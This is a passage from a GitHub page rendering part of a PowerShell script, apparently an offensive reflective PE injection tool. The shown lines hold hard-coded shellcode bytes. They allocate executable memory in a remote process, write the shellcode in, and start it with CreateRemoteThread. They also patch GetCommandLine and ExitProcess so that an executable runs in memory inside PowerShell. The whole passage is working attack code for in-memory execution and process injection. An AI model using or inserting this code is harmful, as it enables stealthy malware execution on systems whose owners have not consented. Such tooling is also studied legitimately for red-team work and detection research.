          <td id="LC2580" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CallDllMainSC3</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xff</span><span class="pl-k">,</span> <span class="pl-c1">0xd0</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xdc</span><span class="pl-k">,</span> <span class="pl-c1">0x5b</span><span class="pl-k">,</span> <span class="pl-c1">0xc3</span>)</td>
        </tr>
        <tr>
          <td id="L2581" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2581"></td>
          <td id="LC2581" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2582" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2582"></td>
          <td id="LC2582" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2583" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2583"></td>
          <td id="LC2583" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2584" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2584"></td>
          <td id="LC2584" class="blob-code blob-code-inner js-file-line">					<span class="pl-c"><span class="pl-c">#</span>Shellcode: CallDllMain.asm</span></td>
        </tr>
        <tr>
          <td id="L2585" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2585"></td>
          <td id="LC2585" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CallDllMainSC1</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x53</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xe3</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xe4</span><span class="pl-k">,</span> <span class="pl-c1">0xf0</span><span class="pl-k">,</span> <span class="pl-c1">0xb9</span>)</td>
        </tr>
        <tr>
          <td id="L2586" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2586"></td>
          <td id="LC2586" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CallDllMainSC2</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xba</span><span class="pl-k">,</span> <span class="pl-c1">0x01</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0xb8</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x50</span><span class="pl-k">,</span> <span class="pl-c1">0x52</span><span class="pl-k">,</span> <span class="pl-c1">0x51</span><span class="pl-k">,</span> <span class="pl-c1">0xb8</span>)</td>
        </tr>
        <tr>
          <td id="L2587" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2587"></td>
          <td id="LC2587" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CallDllMainSC3</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xff</span><span class="pl-k">,</span> <span class="pl-c1">0xd0</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xdc</span><span class="pl-k">,</span> <span class="pl-c1">0x5b</span><span class="pl-k">,</span> <span class="pl-c1">0xc3</span>)</td>
        </tr>
        <tr>
          <td id="L2588" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2588"></td>
          <td id="LC2588" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2589" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2589"></td>
          <td id="LC2589" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SCLength</span> <span class="pl-k">=</span> <span class="pl-smi">$CallDllMainSC1<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$CallDllMainSC2<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$CallDllMainSC3<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> (<span class="pl-smi">$PtrSize</span> <span class="pl-k">*</span> <span class="pl-c1">2</span>)</td>
        </tr>
        <tr>
          <td id="L2590" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2590"></td>
          <td id="LC2590" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$SCLength</span>)</td>
        </tr>
        <tr>
          <td id="L2591" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2591"></td>
          <td id="LC2591" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SCPSMemOriginal</span> <span class="pl-k">=</span> <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L2592" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2592"></td>
          <td id="LC2592" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2593" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2593"></td>
          <td id="LC2593" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$CallDllMainSC1</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L2594" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2594"></td>
          <td id="LC2594" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$CallDllMainSC1<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L2595" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2595"></td>
          <td id="LC2595" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$EffectivePEHandle</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2596" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2596"></td>
          <td id="LC2596" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L2597" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2597"></td>
          <td id="LC2597" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$CallDllMainSC2</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L2598" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2598"></td>
          <td id="LC2598" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$CallDllMainSC2<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L2599" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2599"></td>
          <td id="LC2599" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$DllMainPtr</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2600" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2600"></td>
          <td id="LC2600" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L2601" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2601"></td>
          <td id="LC2601" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$CallDllMainSC3</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L2602" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2602"></td>
          <td id="LC2602" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$CallDllMainSC3<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L2603" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2603"></td>
          <td id="LC2603" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2604" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2604"></td>
          <td id="LC2604" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$RSCAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAllocEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L2605" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2605"></td>
          <td id="LC2605" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$RSCAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2606" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2606"></td>
          <td id="LC2606" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2607" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2607"></td>
          <td id="LC2607" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to allocate memory in the remote process for shellcode<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2608" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2608"></td>
          <td id="LC2608" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2609" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2609"></td>
          <td id="LC2609" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2610" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2610"></td>
          <td id="LC2610" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WriteProcessMemory.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RSCAddr</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMemOriginal</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L2611" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2611"></td>
          <td id="LC2611" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> ((<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>) <span class="pl-k">-or</span> ([<span class="pl-k">UInt64</span>]<span class="pl-smi">$NumBytesWritten</span> <span class="pl-k">-ne</span> [<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span>))</td>
        </tr>
        <tr>
          <td id="L2612" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2612"></td>
          <td id="LC2612" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2613" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2613"></td>
          <td id="LC2613" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to write shellcode to remote process memory.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2614" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2614"></td>
          <td id="LC2614" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2615" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2615"></td>
          <td id="LC2615" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2616" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2616"></td>
          <td id="LC2616" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$RThreadHandle</span> <span class="pl-k">=</span> Create<span class="pl-k">-</span>RemoteThread <span class="pl-k">-</span>ProcessHandle <span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-</span>StartAddress <span class="pl-smi">$RSCAddr</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L2617" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2617"></td>
          <td id="LC2617" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WaitForSingleObject.Invoke</span></span>(<span class="pl-smi">$RThreadHandle</span><span class="pl-k">,</span> <span class="pl-c1">20000</span>)</td>
        </tr>
        <tr>
          <td id="L2618" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2618"></td>
          <td id="LC2618" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-ne</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L2619" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2619"></td>
          <td id="LC2619" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2620" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2620"></td>
          <td id="LC2620" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to CreateRemoteThread to call GetProcAddress failed.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2621" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2621"></td>
          <td id="LC2621" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2622" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2622"></td>
          <td id="LC2622" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2623" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2623"></td>
          <td id="LC2623" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFreeEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RSCAddr</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2624" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2624"></td>
          <td id="LC2624" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2625" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2625"></td>
          <td id="LC2625" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2626" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2626"></td>
          <td id="LC2626" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">elseif</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.FileType</span></span> <span class="pl-k">-ieq</span> <span class="pl-s"><span class="pl-pds">&quot;</span>EXE<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2627" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2627"></td>
          <td id="LC2627" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2628" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2628"></td>
          <td id="LC2628" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process</span></td>
        </tr>
        <tr>
          <td id="L2629" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2629"></td>
          <td id="LC2629" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ExeDoneBytePtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="L2630" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2630"></td>
          <td id="LC2630" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::WriteByte(<span class="pl-smi">$ExeDoneBytePtr</span><span class="pl-k">,</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span>)</td>
        </tr>
        <tr>
          <td id="L2631" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2631"></td>
          <td id="LC2631" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$OverwrittenMemInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Update-ExeFunctions</span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span> <span class="pl-k">-</span>ExeArguments <span class="pl-smi">$ExeArgs</span> <span class="pl-k">-</span>ExeDoneBytePtr <span class="pl-smi">$ExeDoneBytePtr</span></td>
        </tr>
        <tr>
          <td id="L2632" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2632"></td>
          <td id="LC2632" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2633" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2633"></td>
          <td id="LC2633" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread</span></td>
        </tr>
        <tr>
          <td id="L2634" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2634"></td>
          <td id="LC2634" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>	This way the reflectively loaded EXE won&#39;t kill the powershell process when it exits, it will just kill its own thread.</span></td>
        </tr>
        <tr>
          <td id="L2635" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2635"></td>
          <td id="LC2635" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ExeMainPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span></span>)</td>
        </tr>
        <tr>
          <td id="L2636" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2636"></td>
          <td id="LC2636" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call EXE Main function. Address: <span class="pl-k"><span class="pl-pse">$</span></span><span class="pl-pse">(</span><span class="pl-c1">Get-Hex</span> <span class="pl-smi">$ExeMainPtr</span><span class="pl-pse">)</span>. Creating thread for the EXE to run in.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2637" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2637"></td>
          <td id="LC2637" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2638" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2638"></td>
          <td id="LC2638" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Win32Functions<span class="pl-smi">.CreateThread.Invoke</span></span>([<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> <span class="pl-smi">$ExeMainPtr</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> ([<span class="pl-k">UInt32</span>]<span class="pl-c1">0</span>)<span class="pl-k">,</span> [<span class="pl-k">Ref</span>]([<span class="pl-k">UInt32</span>]<span class="pl-c1">0</span>)) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2639" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2639"></td>
          <td id="LC2639" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2640" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2640"></td>
          <td id="LC2640" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">while</span>(<span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2641" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2641"></td>
          <td id="LC2641" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2642" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2642"></td>
          <td id="LC2642" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">Byte</span>]<span class="pl-smi">$ThreadDone</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::ReadByte(<span class="pl-smi">$ExeDoneBytePtr</span><span class="pl-k">,</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L2643" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2643"></td>
          <td id="LC2643" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$ThreadDone</span> <span class="pl-k">-eq</span> <span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="L2644" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2644"></td>
          <td id="LC2644" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2645" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2645"></td>
          <td id="LC2645" class="blob-code blob-code-inner js-file-line">					<span class="pl-c1">Copy-ArrayOfMemAddresses</span> <span class="pl-k">-</span>CopyInfo <span class="pl-smi">$OverwrittenMemInfo</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2646" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2646"></td>
          <td id="LC2646" class="blob-code blob-code-inner js-file-line">					<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>EXE thread has completed.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2647" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2647"></td>
          <td id="LC2647" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">break</span></td>
        </tr>
        <tr>
          <td id="L2648" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2648"></td>
          <td id="LC2648" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2649" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2649"></td>
          <td id="LC2649" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2650" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2650"></td>
          <td id="LC2650" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2651" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2651"></td>
          <td id="LC2651" class="blob-code blob-code-inner js-file-line">					<span class="pl-c1">Start-Sleep</span> <span class="pl-k">-</span>Seconds <span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="L2652" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2652"></td>
          <td id="LC2652" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2653" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2653"></td>
          <td id="LC2653" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2654" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2654"></td>
          <td id="LC2654" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2655" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2655"></td>
          <td id="LC2655" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2656" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2656"></td>
          <td id="LC2656" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-k">@</span>(<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span><span class="pl-k">,</span> <span class="pl-smi">$EffectivePEHandle</span>)</td>
        </tr>
        <tr>
          <td id="L2657" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2657"></td>
          <td id="LC2657" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2658" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2658"></td>
          <td id="LC2658" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2659" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2659"></td>
          <td id="LC2659" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2660" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2660"></td>
          <td id="LC2660" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Invoke-MemoryFreeLibrary</span></td>
        </tr>
        <tr>
          <td id="L2661" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2661"></td>
          <td id="LC2661" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2662" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2662"></td>
          <td id="LC2662" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L2663" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2663"></td>
          <td id="LC2663" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span><span class="pl-k">=</span><span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2664" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2664"></td>
